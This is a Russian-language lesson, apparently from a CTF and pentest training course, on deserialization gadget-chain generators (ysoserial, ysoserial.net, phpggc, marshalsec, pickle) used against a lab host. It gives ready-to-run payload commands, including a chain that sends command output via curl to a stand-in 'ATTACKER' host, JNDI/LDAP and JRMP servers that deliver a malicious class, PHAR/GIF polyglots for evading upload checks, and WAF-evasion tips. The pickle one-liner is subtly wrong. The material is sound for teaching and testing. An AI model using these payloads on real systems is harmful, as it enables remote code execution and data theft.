---
id: web-tool-deser
title: "Инструменты десериализации: ysoserial, phpggc, marshalsec"
category: web
parent: web-tools-exploit
difficulty: medium
order: 3
tags: [deserialization, ysoserial, phpggc, marshalsec, gadget, java, php, pickle]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Полный справочник генераторов gadget-цепочек: ysoserial (Java), ysoserial.net, phpggc, marshalsec (JNDI), node-serialize и pickle — с кодированием и встраиванием."
---

## Задача

Мы нашли на `https://shop.acme-lab.test/api/profile` бинарный blob, который начинается с base64 `rO0AB`. Это **Java-сериализация**: приложение принимает сериализованный объект и разбирает его (`readObject`). Если разбор небезопасен, можно подсунуть такой объект, который при разборе выполнит нашу команду.

Писать такую «ловушку» руками — дни работы. Поэтому используют готовые **генераторы gadget-цепочек**. Разберём их по языкам.

## Данные, с которыми работаем

- Blob `rO0AB...` в теле `/api/profile` (Java).
- Параметр `data`, куда уходит PHP-строка (потенциально `O:...`).
- Возможный JNDI-выход: поле `url` в JSON.

## Что такое gadget-цепочка

**Gadget-цепочка** — последовательность обычных классов, которая при десериализации приводит к нужному эффекту (обычно к выполнению команды). Каждый класс сам по себе безобиден; опасен их порядок в потоке. Генератор просто собирает такой поток за нас.

Первым делом определяем **формат**:

| Признак | Язык/формат | Инструмент |
|---------|-------------|-----------|
| `rO0AB` (base64) / `\xac\xed\x00\x05` | Java | ysoserial |
| `O:4:"User":...` | PHP | phpggc |
| `AAEAAAD...` / BinaryFormatter | .NET | ysoserial.net |
| сырые байты с `\x80\x04` | Python pickle | pickle |

Шпаргалка «генератор под язык»:

| Язык / протокол | Инструмент | Быстрая генерация |
|-----------------|-----------|-------------------|
| Java (RCE) | ysoserial | `java -jar ysoserial.jar CommonsCollections1 'id'` |
| Java (JNDI) | marshalsec | `marshalsec.jndi.LDAPRefServer "http://IP:8000/#Exploit"` |
| .NET | ysoserial.net | `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` |
| PHP | phpggc | `phpggc -b Monolog/RCE1 system id` |
| PHP (PHAR) | phpggc | `phpggc -p phar -o z.phar Monolog/RCE1 system id` |
| Python | pickle | класс с `__reduce__` + `pickle.dumps` |
| Ruby | universal_gadget_chain | `ruby universal_gadget_chain.rb 'id'` |

## Шаг 1: Java — ysoserial

Сначала — **безопасная проверка**. Цепочка `URLDNS` только делает DNS-запрос на твой listener, не выполняя код:

```bash
$ java -jar ysoserial.jar URLDNS 'http://COLLAB.oast.pro/' > probe.bin
$ base64 -w0 probe.bin > probe.b64
$ curl -s https://shop.acme-lab.test/api/profile -d @probe.b64
# на listener пришёл DNS-запрос -> десериализация есть, можно идти дальше
```

Теперь боевая цепочка. Она подбирается по **библиотекам на цели** — «универсальной» нет:

```bash
$ java -jar ysoserial.jar 2>&1 | grep -iE 'commons|spring|groovy'
$ java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/$(id)' > cc6.bin
$ base64 -w0 cc6.bin > cc6.b64
$ curl -s https://shop.acme-lab.test/api/profile -d @cc6.b64 \
  -H 'Content-Type: application/x-java-serialized-object'
# listener: GET /uid=0(root)%20gid=0(root)   -> RCE подтверждён
```

Ключевые цепочки: `CommonsCollections1..7` (commons-collections 3.1/4.0), `CommonsBeanutils1`, `Spring1/2`, `Groovy1`, `Jdk7u21` (только JDK). Если подходящей библиотеки нет, но есть egress — `JRMPClient` + `JRMPListener`:

```bash
$ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
$ java -jar ysoserial.jar JRMPClient 'attacker.local:1099' | base64 -w0
```

## Шаг 2: PHP — phpggc

```bash
$ phpggc -l | grep -i laravel              # список цепочек по фреймворку
$ phpggc -b Monolog/RCE1 system 'id'       # base64-вывод
$ phpggc Laravel/RCE5 system 'bash -c "id"' > laravel.bin
```

Цепочки называются `Фреймворк/Тип`: `Laravel/RCE1..RCE10`, `Symfony/RCE*`, `Monolog/RCE1`, `WordPress/RCE`. Типы: **RCE** — выполнение, **FD** — удаление файла, **FR** — чтение, **FW** — запись, а также SQLI/SSRF/XXE.

Особый случай — **PHAR**: вредоносный объект прячется внутри phar-архива и срабатывает при **файловых операциях** над ним (`file_exists`, `getimagesize`), даже без явного `unserialize`:

```bash
$ phpggc -p phar -o evil.phar Monolog/RCE1 system id
$ phpggc -p phar -pp 'GIF89a' -o evil.gif.phar Monolog/RCE1 system id   # полиглот GIF
```

Полиглот с префиксом `GIF89a` можно переименовать в `.gif` и протащить через загрузчик картинок.

## Шаг 3: .NET — ysoserial.net

```powershell
ysoserial.exe -l
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationkey=... --validationalg=SHA1
```

`-g` — gadget (`TypeConfuseDelegate`, `ObjectDataProvider`, `TextFormattingRunProperties`), `-f` — formatter (`BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `Json.NET`, `Xaml`), `-o` — формат вывода. Плагин `-p ViewState` собирает payload для ASP.NET ViewState (нужен ключ подписи или его отсутствие).

## Шаг 4: JNDI — marshalsec

Классика Log4Shell и JNDI-инъекций. Поднимаем LDAP-сервер, отдающий ссылку на наш класс:

```bash
$ python3 -m http.server 8000                # хостим Exploit.class
$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.1:8000/#Exploit"
$ curl -s 'https://shop.acme-lab.test/api?url=${jndi:ldap://10.0.0.1:1389/Exploit}'
```

Синтаксис URL — `http://<host>:<port>/#<ClassName>`; слушатель по умолчанию на `1389` (LDAP) или `1099` (RMI).

## Шаг 5: Python, Node, Ruby

- **Python pickle:** класс с `__reduce__`, возвращающим вызов функции:
  `python3 -c "import pickle,os; print(pickle.dumps(os.system('id')))" > p.bin`
- **Node.js:** объект с ключом `_$$ND_FUNC$$_` в `node-serialize`.
- **Ruby:** `universal_gadget_chain.rb 'id'` (Marshal).

## Встраивание payload

Payload нужно закодировать под контекст: `base64 -w0` для тела, `phpggc -u`/`-s` для URL, `-j` для JSON. Часто payload кладут в cookie или заголовок — там нужен `urlencode`.

## Полный прогон от начала до конца

1. Blob → `base64 -d | xxd` → определить формат (`aced 0005` = Java).
2. `ysoserial URLDNS` → безопасно подтвердить десериализацию (DNS на listener).
3. Подобрать цепочку по библиотекам → сгенерировать payload.
4. `base64 -w0` → отправить в уязвимое поле.
5. Listener → получить `uid=0(root)` → RCE подтверждён.
6. Для PHP — `phpggc` (при загрузке — PHAR-полиглот).

## Если не сработало

- **Цепочка не подошла.** Нужна **та же** библиотека и версия на цели; сверяй состав (`GadgetProbe`, ошибки).
- **Нет egress.** JNDI/JRMP не достучатся — используй локальную цепочку без callback.
- **PHAR не срабатывает.** Файл должен участвовать в файловой операции; имя-полиглот помогает обойти загрузчик.
- **Blob отклонён.** Проверь `Content-Type` (`application/x-java-serialized-object`) и точное поле.
- **WAF режет.** Кодируй payload (base64/urlencode) и пробуй в другом месте (cookie, заголовок).

## Что мы теперь знаем

- Сначала определяем формат (`rO0AB`, `O:`, BinaryFormatter, pickle).
- `ysoserial` — Java, `ysoserial.net` — .NET, `phpggc` — PHP, `marshalsec` — JNDI.
- Цепочка подбирается по библиотекам цели; «универсальной» нет.
- `URLDNS` — безопасная проверка десериализации.
- Payload кодируется под контекст (base64/urlencode) и встраивается в запрос.

## На что смотреть дальше

- **Скачанный PoC — недоверенный код.** Прочитай, убери эксфильтрацию, направь callback на себя.
- **Версия библиотеки.** `CommonsCollections 3.1` ≠ `4.0`; сверяй перед генерацией.
- **PHAR — скрытый вектор.** Срабатывает на file-ops без `unserialize`.
- **Не убей цель.** Некоторые payload деструктивны — проверяй на стенде.
- **Один foothold — не шлюз для флуда.** Не гоняй массовые запросы через нестабильный RCE.

## Квиз

Проверь себя.

```quiz
- question: "Что означает начало blob'а rO0AB?"
  options:
    - "PHP-сериализация"
    - "Java-сериализация (base64 от aced 0005)"
    - "Python pickle"
    - "Сжатый JSON"
  answer: 1
  explanation: "rO0AB — base64 от магических байтов Java-сериализации."
- question: "Зачем в ysoserial используют цепочку URLDNS?"
  options:
    - "Чтобы выполнить команду"
    - "Чтобы безопасно подтвердить десериализацию одним DNS-запросом"
    - "Чтобы сжать payload"
    - "Чтобы обойти TLS"
  answer: 1
  explanation: "URLDNS только обращается к твоему DNS-listener, без выполнения кода."
- question: "Какой генератор нужен для PHP-цепочек?"
  options:
    - "ysoserial"
    - "phpggc"
    - "marshalsec"
    - "ysoserial.net"
  answer: 1
  explanation: "phpggc генерирует цепочки для Laravel/Symfony/Monolog и др."
- question: "Чем особенный PHAR-payload?"
  options:
    - "Он срабатывает только по HTTPS"
    - "Он активируется при файловых операциях над phar-файлом, даже без явного unserialize"
    - "Он работает только в Windows"
    - "Он не требует кодирования"
  answer: 1
  explanation: "PHAR-метаданные десериализуются при file-ops (file_exists, getimagesize и т.п.)."
- question: "Для чего marshalsec в контексте JNDI-инъекций?"
  options:
    - "Генерирует Java-цепочки"
    - "Поднимает LDAP/RMI-сервер, отдающий ссылку на вредоносный класс"
    - "Кодирует payload в base64"
    - "Сканирует порты"
  answer: 1
  explanation: "marshalsec.jndi.LDAPRefServer отдаёт ссылку на класс по JNDI."
```

## Куда дальше

Дальше (`web-tool-injection-tools`) мы разберём инструменты инъекций — `sqlmap`, `commix`, `tplmap`, `dalfox`. А пока главное запомни: десериализация — это подбор цепочки под **конкретную** библиотеку цели, и первым шагом всегда идёт безопасная проверка.

## Где пригодится

- **CTF (Web):** Java/PHP-десериализация — частый тип задач; генераторы экономят часы.
- **Bug bounty:** корректная цепочка и PHAR-полиглот часто решают исход.
- **Пентест:** проверка десериализации входит в аудит Java/.NET/PHP-стеков.
- **Работа (AppSec):** понимание gadget-цепочек помогает объяснять риск и приоритет фиксов.
